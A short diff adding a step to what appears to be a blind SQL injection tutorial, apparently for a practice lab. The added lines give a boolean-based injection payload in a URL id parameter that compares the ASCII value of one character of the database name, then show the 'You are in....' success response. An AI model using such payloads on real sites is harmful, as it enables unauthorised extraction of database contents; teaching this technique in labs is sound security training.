@@ -277,6 +277,16 @@ And the result is 0; it means false, hence the valid value lies between 97 and 1
 
 We get the 3rd value which is 99 and check it in the ASCII table sheet.
 
+Now we use this query in the URL:
+
+**?id=1′ AND (ascii(substr((select database()) ,3,3)) = 99 –+**
+
+After that u will get this....
+
+**You are in....**
+
+
+
 
 
 
